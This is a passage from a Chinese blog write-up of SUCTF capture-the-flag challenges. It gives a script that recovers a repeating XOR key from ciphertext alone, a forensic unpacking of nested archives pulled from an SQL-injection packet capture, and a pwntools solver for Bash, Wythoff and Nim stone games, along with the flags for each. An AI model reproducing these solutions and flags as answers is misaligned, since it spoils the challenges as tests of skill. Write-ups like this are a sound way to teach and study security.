ord(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"plain.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = flag.flag</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(key) &gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">assert</span> flag.languageOfPlain == <span class="string">"English"</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">"base_64"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>这道题是一个唯密文攻击。给定了通过xor加密后密文cipher.txt，同时给出了以下几个条件：</p>
<ol>
<li>密钥（即flag）长度在(1, 50)之间</li>
<li>加密的对象是一段英文文本</li>
</ol>
<p>总体来讲，由于flag较短且密文较长，条件比较充足，这道题相对还是比较简单的。</p>
<p>首先考虑到词频分析法。假定明文是空格（0x20），分析密钥处于可读字符集中的字频。通过分析可以发现，24位的时候有一个明显的高峰，事实也证明了flag确实是24位。</p>
<p>在获得这个24位的可能值之后，通过穷举法分析密钥。尝试可读取字符集中的任意字符，若解密得到的明文处于英文字符集内，即认为该字符有效。通过该法分析可得flag。</p>
<p>但存在一些问题:</p>
<ol>
<li>实际解法中没有使用词频分析的结论，而是穷举了所有的长度。穷举的时间复杂度是可以接受的。</li>
<li>由于不明原因，使用简单的明文字符集并不能分析出结果，发现需要添加\xef\xbc\x8c等3个字符才能得到flag。这里是出于什么原因不太明确。</li>
</ol>
<p>解题脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">engchar = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789. \x0d\x0a\"'!?(),:;$%-_=\xef\xbc\x8c"</span></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">formatter = logging.Formatter(<span class="string">'%(asctime)s %(levelname)-8s: %(message)s'</span>)</span><br><span class="line">console_handler = logging.StreamHandler(sys.stdout)</span><br><span class="line">console_handler.setFormatter(formatter) </span><br><span class="line">logger.addHandler(console_handler)</span><br><span class="line">logger.setLevel(logging.WARNING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cipher.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().decode(<span class="string">'base_64'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isengchar</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> engchar:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    l = len(cipher)</span><br><span class="line">    <span class="keyword">for</span> slength <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">50</span>):</span><br><span class="line">        logger.info(<span class="string">'Fuzzing Length %d'</span> % slength)</span><br><span class="line">        a = [<span class="string">'@'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>)]</span><br><span class="line">        <span class="keyword">for</span> fuzzingchar <span class="keyword">in</span> engchar:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> range(slength):</span><br><span class="line">                pr = <span class="string">""</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(l / slength):</span><br><span class="line">                    pr += chr(ord(cipher[i*slength+p]) ^ ord(fuzzingchar))</span><br><span class="line">                ans = isengchar(pr)</span><br><span class="line">                <span class="keyword">if</span> ans == <span class="keyword">True</span>:</span><br><span class="line">                    logger.info(<span class="string">'confirm char %s vaild at No. %d'</span> % (fuzzingchar, p))</span><br><span class="line">                    a[p] = fuzzingchar</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logger.debug(<span class="string">'found char %s(%.2x) in ret for %s(%.2x) at No. %d'</span> % (ans, ord(ans), fuzzingchar, ord(fuzzingchar), p))</span><br><span class="line">            <span class="comment"># raw_input()</span></span><br><span class="line">        <span class="keyword">print</span> slength, <span class="string">''</span>.join(a)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag{Something Just Like This}</p>
</blockquote>
<h3 id="TNT"><a href="#TNT" class="headerlink" title="TNT"></a>TNT</h3><p>压缩包层数实在太多……</p>
<p>题目给定的是一个PCAP包，可以看出这个包是SQLMap之类的工具注入DVWA造成的。分析注入本身，发现在guestbook表comment字段中注出一段base64（伪）：</p>
<blockquote>
<p>dont bother me,Im using hammer TNT</p>
</blockquote>
<p>额不是这个。。。</p>
<blockquote>
<p>QlpoOTFBWSZTWRCesQgAAKZ///3ry/u5q9q1yYom/PfvRr7v2txL3N2uWv/aqTf7ep/usAD7MY6NHpAZAAGhoMjJo0GjIyaGgDTIyGajTI0HqAAGTQZGTBDaTagbUNppkIEGQaZGjIGmgMgMjIyAaAPU9RpoMjAjBMEMho0NMAjQ00eo9QZNGENDI0zUKqflEbU0YhoADQDAgAaaGmmgwgMTE0AGgAyNMgDIGmTQA0aNGg0HtQQQSBQSMMfFihJBAKBinB4QdSNniv9nVzZlKSQKwidKifheV8cQzLBQswEuxxW9HpngiatmLK6IRSgvQZhuuNgAu/TaDa5khJv09sIVeJ/mhAFZbQW9FDkCFh0U2EI5aodd1J3WTCQrdHarQ/Nx51JAx1b/A9rucDTtN7Nnn8zPfiBdniEzIZn0L1L90ATgJjogOUtiR77tVC3EVA1LJ0Ng2skZVCAt+Sv17EiHQMFt6u8cKsfMu/JaFFRtwudUYYo9OHGLvLxgN/Sr/bhQITPglJ9MvCIqIJS0/BBxpz3gxI2bArd8gnF+IbeQQM3c1.M+FZ+E64l1ccYFRa26TC6uGQ0HnstY5/yc+nAP8Rfsim4xoEiNEEZclCsLAILkjnz6BjVshxBdyRThQkBCesQg=</p>
</blockquote>
<p>这不是一个合法的base64，可以看到少了大写”X”而多了”.”。替换之，得到：</p>
<blockquote>
<p>42 5a 68 39 31 41 59 26 …</p>
</blockquote>
<p>查询，425A6839是bzip2的文件头。bzip2 -d解压之，得到文件a:</p>
<blockquote>
<p>fd 37 7a 58 5a 00 00 04 …</p>
</blockquote>
<p>这次是LZMA。xz -d解压之：</p>
<blockquote>
<p>1f 8b 08 08 03 e1 04 5b …</p>
</blockquote>
<p>又变成gzip（顺带一提，pcap包里的HTTP流量也是gzip压缩的）。gzip -d解压, 得到33.333：</p>
<blockquote>
<p>ff d8 ff 04 14 00 00 00 …</p>
</blockquote>
<p>貌似是JPEG，但JPEG的文件头不是FFD8FFE0么？改成jpg也打不开。</p>
<p>此时注意到，后几位是04 14 00 00 00 08 00 …，似乎符合ZIP的文件构造？在下方寻找，也找到了ZIP的下一个magic number 504B0102。修改成ZIP的文件头 50 4b 03 04，顺利解压，得到文件22222：</p>
<blockquote>
<p>50 4b 03 04 1a 07 00 cf</p>
</blockquote>
<p>故技重施，1A0700CF很明显是RAR格式了。修改成RAR的文件头52 61 72 21，解压得到flag：</p>
<blockquote>
<p>suctf{233333th1s1sf1ag23333333333333333}</p>
</blockquote>
<p>讲道理可能确实有一些脑洞吧，然而搞取证的对文件头实在是再熟悉不过了。</p>
<h3 id="GAME"><a href="#GAME" class="headerlink" title="GAME"></a>GAME</h3><p>和电脑玩取石子游戏，而且玩遍了Bash/Nimm/Wythoff三种花样。</p>
<p>解法参考<a href="https://blog.csdn.net/ojshilu/article/details/16812173" target="_blank" rel="noopener">文档</a>，详细解释了这三种取石子游戏的模式和解法，这里简单做个整理：</p>
<h4 id="先手胜利的条件-非奇异局势"><a href="#先手胜利的条件-非奇异局势" class="headerlink" title="先手胜利的条件:非奇异局势"></a>先手胜利的条件:非奇异局势</h4><p>引入奇异局势的概念：当面对局势a时，A先手无法获胜，则称局势a是奇异局势。显然石子数为0的局势也是奇异局势。</p>
<p>可以证明，所有的非奇异局势都可以经过一次操作达到奇异局势。那么A若想先手获胜，唯一的条件是当前局势不是奇异局势，并通过操作使对方面临奇异局势。</p>
<h4 id="取石子游戏的种类"><a href="#取石子游戏的种类" class="headerlink" title="取石子游戏的种类"></a>取石子游戏的种类</h4><h5 id="Bash-Game"><a href="#Bash-Game" class="headerlink" title="Bash Game"></a>Bash Game</h5><p>有1堆含n个石子，两个人轮流从这堆物品中取物，规定每次至少取1个，最多取m个。取走最后石子的人获胜。</p>
<p>这里的奇异局势是使得石子数n符合\(n \equiv 1 \pmod{m}\)的情况。显然，游戏策略是取石子使石子数符合前式。</p>
<h5 id="Nimm-Game"><a href="#Nimm-Game" class="headerlink" title="Nimm Game"></a>Nimm Game</h5><p>有k堆各n个石子，两个人轮流从某一堆取任意多的物品，规定每次至少取一个，多者不限。取走最后石子的人获胜。</p>
<p>将k堆石子的数量取异或，若结果为0则为奇异局势。可以通过穷举法穷举出下一步策略：符合使xor结果为0，且所需取的数小于该堆石子总数的都是可行解。</p>
<h5 id="Wythoff-Game"><a href="#Wythoff-Game" class="headerlink" title="Wythoff Game"></a>Wythoff Game</h5><p>有2堆各n个石子，两个人轮流从某一堆或同时从两堆中取同样多的物品，规定每次至少取1个，多者不限。取走最后石子的人获胜。</p>
<p>这里的奇异局势比较复杂。记石子堆分别为A，B，归纳法分析奇异局势的状况可以发现，石子堆A的数量符合黄金分割的增长规律。换言之，奇异局势数列符合如下通项公式：</p>
<p>$$\begin{aligned}<br>a_k &amp;= \lfloor \frac{k \cdot (1 + \sqrt{5})}{2} \rfloor \<br>b_k &amp;= a_k + k<br>\end{aligned}$$</p>
<p>解法么。。。也是穷举，穷举达到奇异局势的方案，但是由于局面复杂多样，这里的解法要复杂一些。可以参考ACM题HDU 2177的解法。</p>
<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>写了一夜大概。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">digits = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line">wythoff_table_a = [ int(k*(<span class="number">1</span>+math.sqrt(<span class="number">5.0</span>))/<span class="number">2</span>) <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">100000</span>) ]</span><br><span class="line">wythoff_table_b = [ k + wythoff_table_a[k] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">100000</span>) ]</span><br><span class="line">wythoff_table = [wythoff_table_a, wythoff_table_b]</span><br><span class="line">x = (<span class="number">1</span> + math.sqrt(<span class="number">5.0</span>))/<span class="number">2.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashcollison</span><span class="params">(r, t)</span>:</span></span><br><span class="line">    raw = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> raw:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> raw:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> raw:</span><br><span class="line">                    p = <span class="string">"%s%s%s%s%s"</span> % (t, i, j, k, l)</span><br><span class="line">                    <span class="comment"># print sha256(p).hexdigest()</span></span><br><span class="line">                    <span class="comment"># print r</span></span><br><span class="line">                    <span class="keyword">if</span> sha256(p).hexdigest().strip() == r.strip():</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">"%s%s%s%s"</span> % (i, j, k, l)</span><br><span class="line">                        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gottable</span><span class="params">(x)</span>:</span></span><br><span class="line">    ret = []</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">        ret.append(r)</span><br><span class="line">        r += x</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(p, q)</span>:</span></span><br><span class="line">p = p ^ q</span><br><span class="line">q = q ^ p</span><br><span class="line">p = p ^ q</span><br><span class="line"><span class="keyword">return</span> p, q</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    con = remote(<span class="string">'game.suctf.asuri.org'</span>, <span class="number">10000</span>)</span><br><span class="line">    con.recvuntil(<span class="string">'sha256('</span>)</span><br><span class="line">    r = con.recvline()</span><br><span class="line">    hash = r.split(<span class="string">'=='</span>)[<span class="number">1</span>].strip()</span><br><span class="line">    text = r[:<span class="number">12</span>]</span><br><span class="line">    log.info(<span class="string">"Collision Hash (%s+xxxx)==%s"</span> % (text, hash))</span><br><span class="line">    con.sendline(hashcollison(hash, text))</span><br><span class="line">    log.info(<span class="string">"Collision Done. Enter the game"</span>)</span><br><span class="line"></span><br><span class="line">    con.recvuntil(<span class="string">'skip.'</span>)</span><br><span class="line">    <span class="comment"># rnd = 0</span></span><br><span class="line">    log.info(<span class="string">"Bash Game Start"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>: <span class="comment"># Bash Game</span></span><br><span class="line">        <span class="comment"># rnd += 1</span></span><br><span class="line">        con.recvuntil(<span class="string">"===========================================================================\n"</span>)</span><br><span class="line">        r = con.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> r != <span class="string">"R"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        con.recvuntil(<span class="string">'ound '</span>)</span><br><span class="line">        rnd = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">        log.info(<span class="string">"Round %s Start"</span> % rnd)</span><br><span class="line">        p = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">        v = digits.findall(p)</span><br><span class="line">        stonecnt = int(v[<span class="number">0</span>])</span><br><span class="line">        maxgot = int(v[<span class="number">2</span>])</span><br><span class="line">        p = gottable(maxgot+<span class="number">1</span>)</span><br><span class="line">        log.info(<span class="string">"Round %s: %d Total, Got %d max"</span> % (rnd, stonecnt, maxgot))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            r = con.recvline()</span><br><span class="line">            stonecnt = int(digits.findall(r)[<span class="number">0</span>])</span><br><span class="line">            <span class="comment"># log.info("Round %s: %d Left" % (rnd, stonecnt))</span></span><br><span class="line">            con.recvline()</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> p[i] &lt;= stonecnt:</span><br><span class="line">                i += <span class="number">1</span>;</span><br><span class="line">            ans = stonecnt - p[i<span class="number">-1</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> ans == <span class="number">0</span>:</span><br><span class="line">                snt = <span class="string">'GG'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                snt = str(ans)</span><br><span class="line">            con.sendline(snt)</span><br><span class="line">            r = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">if</span> snt == <span class="string">"GG"</span>:</span><br><span class="line">                c = digits.findall(r)[<span class="number">0</span>]</span><br><span class="line">                log.info(<span class="string">"Round %s GG. %s chances left."</span> % (rnd, c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="string">"You win!"</span>:</span><br><span class="line">                log.info(<span class="string">"Round %s Win"</span> % rnd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    log.info(<span class="string">"Wythoff Game Start"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>: <span class="comment"># Wythoff Game</span></span><br><span class="line">        con.recvuntil(<span class="string">"===========================================================================\n"</span>)</span><br><span class="line">        r = con.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> r != <span class="string">"R"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        con.recvuntil(<span class="string">'ound '</span>)</span><br><span class="line">        rnd = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">        log.info(<span class="string">"Round %s Start"</span> % rnd)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            r = con.recvline()</span><br><span class="line">            piles = [ int(i) <span class="keyword">for</span> i <span class="keyword">in</span> digits.findall(r) ]</span><br><span class="line">            <span class="comment"># log.info("Round %s: %d %d" % (rnd, piles[0], piles[1]))</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> piles[<span class="number">0</span>] &lt;= piles[<span class="number">1</span>]:</span><br><span class="line">                varorder = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                piles[<span class="number">0</span>], piles[<span class="number">1</span>] = swap(piles[<span class="number">0</span>], piles[<span class="number">1</span>])</span><br><span class="line">                varorder = [<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">            <span class="comment"># log.info("Round %s: varorder %d %d" % (rnd, varorder[0], varorder[1]))</span></span><br><span class="line">            con.recvline()</span><br><span class="line">            </span><br><span class="line">            snt = <span class="string">""</span></span><br><span class="line">            k = piles[<span class="number">1</span>] - piles[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> int(k * x) == piles[<span class="number">0</span>]:</span><br><span class="line">                snt = <span class="string">"GG"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, piles[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">                    n = piles[<span class="number">0</span>] - i</span><br><span class="line">                    m = piles[<span class="number">1</span>] - i</span><br><span class="line">                    k = m - n</span><br><span class="line">                    <span class="keyword">if</span> int(k*x) == n:</span><br><span class="line">                        snt = <span class="string">"%d 2"</span> % i</span><br><span class="line">                <span class="keyword">if</span> snt == <span class="string">""</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(piles[<span class="number">1</span>]):</span><br><span class="line">                        n = piles[<span class="number">0</span>]</span><br><span class="line">                        m = i</span><br><span class="line">                        <span class="keyword">if</span> n &gt; m:</span><br><span class="line">                            n,m = swap(n,m)</span><br><span class="line">                        k = m - n</span><br><span class="line">                        <span class="keyword">if</span> int(k*x) == n:</span><br><span class="line">                            snt = <span class="string">"%d %d"</span> % (piles[<span class="number">1</span>] - i, varorder[<span class="number">1</span>])</span><br><span class="line">            <span class="comment"># log.info("Payload: %s" % snt)</span></span><br><span class="line">            con.sendline(snt)</span><br><span class="line">            r = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">            <span class="comment"># log.info(r)</span></span><br><span class="line">            <span class="keyword">if</span> snt == <span class="string">"GG"</span>:</span><br><span class="line">                c = digits.findall(r)[<span class="number">0</span>]</span><br><span class="line">                log.info(<span class="string">"Round %s GG. %s chances left."</span> % (rnd, c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="string">"You win!"</span>:</span><br><span class="line">                log.info(<span class="string">"Round %s Win"</span> % rnd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">"Nimm Game Start"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>: <span class="comment"># Nimm Game</span></span><br><span class="line">        con.recvuntil(<span class="string">"===========================================================================\n"</span>)</span><br><span class="line">        r = con.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> r != <span class="string">"R"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        con.recvuntil(<span class="string">'ound '</span>)</span><br><span class="line">        rnd = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">        log.info(<span class="string">"Round %s Start"</span> % rnd)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            r = con.recvline()</span><br><span class="line">            piles = [ int(i) <span class="keyword">for</span> i <span class="keyword">in</span> digits.findall(r) ]</span><br><span class="line">            <span class="comment"># log.info("Round %s: %d %d %d %d %d" % (rnd, piles[0], piles[1], piles[2], piles[3],piles[4]))</span></span><br><span class="line">            </span><br><span class="line">            xorret = reduce(<span class="keyword">lambda</span> x,y: x ^ y, piles)</span><br><span class="line">            </span><br><span class="line">            snt = <span class="string">""</span></span><br><span class="line">            <span class="keyword">if</span> xorret == <span class="number">0</span>:</span><br><span class="line">                snt = <span class="string">"GG"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                    middle_xor = xorret ^ piles[i]</span><br><span class="line">                    needed = middle_xor ^ <span class="number">0</span></span><br><span class="line">                    <span class="comment"># log.info("piles[%d] = %d, needed is %d" % (i, piles[i], needed))</span></span><br><span class="line">                    <span class="keyword">if</span> needed &lt; piles[i]:</span><br><span class="line">                        snt = <span class="string">"%d %d"</span> % (piles[i] - needed, i)</span><br><span class="line">                    </span><br><span class="line">            con.sendline(snt)</span><br><span class="line">            r = con.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">if</span> snt == <span class="string">"GG"</span>:</span><br><span class="line">                c = digits.findall(r)[<span class="number">0</span>]</span><br><span class="line">                log.info(<span class="string">"Round %s GG. %s chances left."</span> % (rnd, c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="string">"You win!"</span>:</span><br><span class="line">                log.info(<span class="string">"Round %s Win"</span> % rnd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> rnd == <span class="string">'20'</span>:</span><br><span class="line">            con.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>SUCTF{gGGGGggGgGggGGggGGGggGgGgggGGGGGggggggGgGggggGg}</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>求大佬讲解Getshell做法。</p>
<h3 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h3><p>Hitcon 2017某题的一半</p>
